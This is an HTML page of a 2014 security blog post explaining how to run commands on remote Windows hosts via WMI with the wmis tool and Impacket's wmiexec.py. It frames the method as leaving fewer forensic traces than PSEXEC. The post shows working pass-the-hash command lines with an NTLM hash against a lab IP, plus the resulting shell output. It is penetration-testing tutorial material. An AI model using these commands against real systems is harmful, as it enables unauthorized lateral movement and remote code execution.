@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Executing code via SMB / DCOM without PSEXEC</title>
+    <meta name="description" content="" />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="shortcut icon" href="//blog.room362.com/themes/ichi/favicon.ico">
+
+    <script type="text/javascript" src="//blog.room362.com/themes/ichi/assets/js/vendor/fastclick.js?v=1.0.0"></script>
+    <script type="text/javascript" src="//blog.room362.com/themes/ichi/assets/js/vendor/modernizr.js?v=1.0.0"></script>
+
+
+    <link rel="stylesheet" type="text/css" href="//blog.room362.com/themes/ichi/assets/css/normalize.css?v=1.0.0" />
+    <link rel="stylesheet" type="text/css" href="//blog.room362.com/themes/ichi/assets/css/foundation.min.css?v=1.0.0" />
+    <!--[if lte IE 8]>
+        <link rel="stylesheet" type="text/css" href="//blog.room362.com/themes/ichi/assets/css/outdatedBrowser.min.css?v=1.0.0">
+    <![endif]-->
+    <link rel="stylesheet" type="text/css" href="//blog.room362.com/themes/ichi/assets/fonts/foundation-icons/foundation-icons.css?v=1.0.0" />
+    <link rel="stylesheet" type="text/css" href="//blog.room362.com/themes/ichi/assets/css/styles.css?v=1.0.0" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Open+Sans:300,700,400|Source+Sans+Pro:300,400,600,700,900,300italic,400italic,600italic,700italic,900italic" />
+
+    <link rel="canonical" href="http://blog.room362.com/2014/04/19/Executing-code-via-SMB-DCOM-without-PSEXEC.html" />
+    
+    <meta property="og:site_name" content="Room362.com" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Executing code via SMB / DCOM without PSEXEC" />
+    <meta property="og:description" content="PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &quot;psexec&quot; tools work is: (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&amp;#8217;..." />
+    <meta property="og:url" content="http://blog.room362.com/2014/04/19/Executing-code-via-SMB-DCOM-without-PSEXEC.html" />
+    <meta property="article:published_time" content="2014-04-19T04:00:00.000Z" />
+    <meta property="article:modified_time" content="2015-05-16T06:49:23.204Z" />
+    <meta property="article:tag" content="wmi" />
+    <meta property="article:tag" content="wmis" />
+    <meta property="article:tag" content="impacket" />
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Executing code via SMB / DCOM without PSEXEC" />
+    <meta name="twitter:description" content="PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &quot;psexec&quot; tools work is: (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&amp;#8217;..." />
+    <meta name="twitter:url" content="http://blog.room362.com/2014/04/19/Executing-code-via-SMB-DCOM-without-PSEXEC.html" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "Room362.com",
+    "author": {
+        "@type": "Person",
+        "name": "Rob Fuller",
+        "image": "https://avatars.githubusercontent.com/u/679319?v=3",
+        "url": "undefined/author/undefined",
+        "sameAs": "http://www.room362.com/"
+    },
+    "headline": "Executing code via SMB / DCOM without PSEXEC",
+    "url": "http://blog.room362.com/2014/04/19/Executing-code-via-SMB-DCOM-without-PSEXEC.html",
+    "datePublished": "2014-04-19T04:00:00.000Z",
+    "dateModified": "2015-05-16T06:49:23.204Z",
+    "keywords": "wmi,  wmis,  impacket",
+    "description": "PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &quot;psexec&quot; tools work is: (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&amp;#8217;..."
+}
+    </script>
+
+    <meta name="generator" content="Ghost ?" />
+    <link rel="alternate" type="application/rss+xml" title="Room362.com" href="http://blog.room362.com/rss" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">
+</head>
+<body class="post-template tag-wmi tag-wmis tag-impacket">
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdate" href="http://outdatedbrowser.com/">Update my browser now</a></p>
+</div>
+
+<nav class="top-bar hide-for-large-up" data-topbar >
+  <ul class="title-area">
+    <li class="name">
+
+    </li>
+    <li class="home"><a class="fi-home" href="http://blog.room362.com"></a></li>
+    <li class="toggle-topbar"><a href="#" id="trigger-overlay" class="fi-list"></a></li>
+  </ul>
+
+<div class="overlay overlay-scale">
+    <button type="button" class="overlay-close">Close</button>
+    <nav>
+        <ul>
+            <li><a href="http://blog.room362.com">Home</a></li>
+        </ul>
+    </nav>
+</div>
+
+</nav>
+
+<div class="row">
+
+<div class="small-16 medium-16 large-4 columns right head-area" >
+
+<header class="site-head">
+    <div class="vertical">
+        <div class="site-head-content inner">
+            <ul class="side-nav blog-menu show-for-large-up">
+                <li><a class="fi-home" href="http://blog.room362.com"></a></li>
+                <li><a class="fi-torso" href="http://blog.room362.com/about"></a></li>
+                <li><a class="fi-mail" href="http://blog.room362.com/contact"></a></li>
+            </ul>
+            
+            <h1 class="blog-title">Room362.com</h1>
+            <hr>
+            <p class="blog-description"></p>
+            <div class="blog-network">
+<!--                 <a href="#" class="fi-social-pinterest"></a>
+                <a href="#" class="fi-social-linkedin"></a>
+                <a href="#" class="fi-social-behance"></a>
+                <a href="#" class="fi-social-deviant-art"></a>
+                <a href="#" class="fi-social-dribbble"></a>
+                <a href="#" class="fi-social-flickr"></a>
+                <a href="#" class="fi-social-github"></a>
+                <a href="#" class="fi-social-skype"></a>
+                <a href="#" class="fi-social-snapchat"></a>
+                <a href="#" class="fi-social-steam"></a>
+                <a href="#" class="fi-social-xbox"></a>
+                <a href="#" class="fi-social-reddit"></a> -->
+                  <a href="https://plus.google.com/112597020392561644851/" class="fi-social-google-plus"></a>
+                  <a href="https://github.com/mubix" class="fi-social-github"></a>
+                  <a href="https://twitter.com/mubix" class="fi-social-twitter"></a>
+                  <a href="https://www.facebook.com/mubix" class="fi-social-facebook"></a>
+            </div>
+        </div>
+    </div>
+</header>
+
+</div>
+
+
+<div class="small-16 medium-16 large-12 columns main-column left">
+    
+
+<main class="content" role="main">
+
+    <article class="post tag-wmi tag-wmis tag-impacket">
+
+
+            <h1 class="post-title">Executing code via SMB / DCOM without PSEXEC</h1>
+
+            <span class="post-meta label"><time datetime="2014-04-19">19 Apr 2014</time></span>
+
+            <section class="post-content">
+                <div id="preamble">
+<div class="sectionbody">
+<div class="paragraph">
+<p>PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all "psexec" tools work is:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>(<em>Optional</em>) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&#8217;s tool) to the ADMIN$ share</p>
+</li>
+<li>
+<p>Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one.</p>
+</li>
+<li>
+<p>Run the service</p>
+</li>
+<li>
+<p>Stop and delete the service and uploaded file pulling down the resulting output if any from the execution.</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>Now, as you can guess, the uploading of a file, creating, starting, stopping, and deletion of services create quite the logs and forensic evidence.</p>
+</div>
+<div class="paragraph">
+<p>As you might imagine, thats not the best thing for us on the offensive side of infosec. Luckily big brother Microsoft provides another option, WMI (Windows Management Interface). I demonstrated the use of this in the past: [HERE](/blog/2013/06/10/volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/) and [HERE](/blog/2013/10/06/dumping-a-domain-worth-of-passwords-with-mimikatz/)</p>
+</div>
+<div class="paragraph">
+<p>The downside to using the WMIC directly is that you need a valid token or a valid password for it to work. Passing the hash didn&#8217;t used to be an available option.</p>
+</div>
+<div class="paragraph">
+<p>That has changed with the "wmis" package on Kali Linux that incorporates the <a href="http://passing-the-hash.blogspot.com/2013/07/WMIS-PowerSploit-Shells.html">"Pass-the-Hash for 15 years toolkit"</a></p>
+</div>
+<div class="paragraph">
+<p>(There is a slight problem where you have to play with it a bit to get it working on 64 bit Kali)</p>
+</div>
+<div class="paragraph">
+<p>The other solution is supplied as an example in the <a href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=tool&amp;name=Impacket">Impacket library</a> <a href="https://code.google.com/p/impacket/source/browse/trunk/examples/wmiexec.py">"wmiexec.py"</a>. In my experience there are a few features that make it the better option.</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Installing it on a random VPS is dead simple and doesn&#8217;t need the Kali repos to get right, nor Debian/Ubuntu.</p>
+</li>
+<li>
+<p>It defaults to an "semi-interactive shell" which writes and reads output from the ADMIN$ shell by default. Something I would normally have to do manually with a bunch of tools</p>
+</li>
+<li>
+<p>As with the WMIS package, it allows you to just create a process without the ADMIN$ write/read.</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>Enough crazy talk here is an example usage of each:</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_wmis">WMIS</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="_usage">Usage:</h3>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code>root@wpad:~# wmis
+Usage: [-?NPV] [-?|--help] [--usage] [-d|--debuglevel=DEBUGLEVEL] [--debug-stderr] [-s|--configfile=CONFIGFILE]
+        [--option=name=value] [-l|--log-basename=LOGFILEBASE] [--leak-report] [--leak-report-full]
+        [-R|--name-resolve=NAME-RESOLVE-ORDER] [-O|--socket-options=SOCKETOPTIONS] [-n|--netbiosname=NETBIOSNAME]
+        [-W|--workgroup=WORKGROUP] [--realm=REALM] [-i|--scope=SCOPE] [-m|--maxprotocol=MAXPROTOCOL]
+        [-U|--user=[DOMAIN\]USERNAME[%PASSWORD]] [-N|--no-pass] [--password=STRING] [-A|--authentication-file=FILE]
+        [-S|--signing=on|off|required] [-P|--machine-pass] [--simple-bind-dn=STRING] [-k|--kerberos=STRING]
+        [--use-security-mechanisms=STRING] [-V|--version]
+        //host
+
+Example: wmis -U [domain/]adminuser%password //host cmd.exe /c dir c:\ &gt; c:\windows\temp\output.txt</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_example">Example:</h2>
+<div class="sectionbody">
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code>root@wpad:~# wmis -U administrator%aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 //172.16.102.141 calc.exe
+HASH PASS: Substituting user supplied NTLM HASH...
+HASH PASS: Substituting user supplied NTLM HASH...
+[wmi/wmis.c:172:main()] 1: calc.exe
+NTSTATUS: NT_STATUS_OK - Success</code></pre>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_wmiexec_py">wmiexec.py</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Using a password, but with hashes you just tell it <code>-hashes</code> :</p>
+</div>
+<div class="sect2">
+<h3 id="_usage_2">Usage:</h3>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code>root@wpad:~/impacket/examples# ./wmiexec.py
+Impacket v0.9.12-dev - Copyright 2002-2014 Core Security Technologies
+
+usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-hashes LMHASH:NTHASH]
+                  target [command [command ...]]
+
+positional arguments:
+  target                [domain/][username[:password]@]&lt;address&gt;
+  command               command to execute at the target. If empty it will
+                        launch a semi-interactive shell
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -share SHARE          share where the output will be grabbed from (default
+                        C$)
+  -nooutput             whether or not to print the output (no SMB connection
+                        created)
+
+authentication:
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is LMHASH:NTHASH</code></pre>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_example_2">Example:</h3>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code>root@wpad:~/impacket/examples# ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 administrator@172.16.102.141
+Impacket v0.9.12-dev - Copyright 2002-2014 Core Security Technologies
+
+SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+C:\&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5CCA-B528
+
+ Directory of C:\
+
+07/13/2009  11:20 PM    &lt;DIR&gt;          PerfLogs
+10/07/2013  03:26 PM    &lt;DIR&gt;          Program Files
+07/14/2009  01:08 AM    &lt;DIR&gt;          Program Files (x86)
+04/25/2014  02:21 AM    &lt;DIR&gt;          Users
+05/11/2014  03:39 PM    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  52,884,389,888 bytes free
+
+C:\&gt;</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+                        <aside class="tags fi-pricetag-multiple">Posted on <a href="http://blog.room362.com/tag/wmi">wmi</a>, <a href="http://blog.room362.com/tag/wmis"> wmis</a>, <a href="http://blog.room362.com/tag/impacket"> impacket</a></aside>
+            </section>
+            <hr>
+            <footer class="post-footer">
+
+                <section class="share">
+                    <h4>Liked this post ? Share it.</h4>
+                    <a class="fi-social-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.room362.com/2014/04/19/Executing-code-via-SMB-DCOM-without-PSEXEC.html"
+                        onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    </a>
+                    <a class="fi-social-twitter" href="https://twitter.com/share?text=Executing%20code%20via%20SMB%20%2F%20DCOM%20without%20PSEXEC&amp;url=http://blog.room362.com/2014/04/19/Executing-code-via-SMB-DCOM-without-PSEXEC.html"
+                        onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    </a>
+                    <a class="fi-social-google-plus" href="https://plus.google.com/share?url=http://blog.room362.com/2014/04/19/Executing-code-via-SMB-DCOM-without-PSEXEC.html"
+                       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    </a>
+                </section>
+
+                <section class="author">
+                    <header>
+                        <span>About the author</span>
+                    </header>
+                    <section>
+                        <h4>Rob Fuller</h4>
+                        <img src="https://avatars.githubusercontent.com/u/679319?v=3">
+                        
+                        <a href="http://www.room362.com/">http://www.room362.com/</a>
+                    </section>
+                    <footer>
+                         <p></p>
+                    </footer>
+                </section>
+
+        <div class="clearfix"></div>
+                    <hr>
+
+            </footer>
+
+        <h3 class="title-disqus"><span class="fi-comments"></span>Discussions</h3>
+
+
+
+
+        <section class="post-comments">
+          <div id="disqus_thread"></div>
+          <script type="text/javascript">
+          var disqus_shortname = 'room362'; // required: replace example with your forum shortname
+          /* * * DON'T EDIT BELOW THIS LINE * * */
+          (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+          })();
+          </script>
+          <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </section>
+
+
+    </article>
+
+</main>
+
+</div>
+
+</div>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.9.0/moment-with-locales.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/highlight.min.js?v="></script> 
+      <script type="text/javascript">
+        jQuery( document ).ready(function() {
+          // change date with ago
+          jQuery('ago.ago').each(function(){
+            var element = jQuery(this).parent();
+            element.html( moment(element.text()).fromNow());
+          });
+        });
+
+        hljs.initHighlightingOnLoad();      
+      </script>
+
+    <!--[if lte IE 8]>
+        <script type="text/javascript" src="//blog.room362.com/themes/ichi/assets/js/outdatedBrowser.min.js?v=1.0.0"></script>
+    <![endif]-->
+    <script type="text/javascript" src="//blog.room362.com/themes/ichi/assets/js/min/built.js?v=1.0.0"></script>
+
+    <script>
+      $(document).foundation();
+    </script>
+
+    <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-46757822-1', 'auto');
+    ga('send', 'pageview');
+
+    </script>
+</body>
+</html>
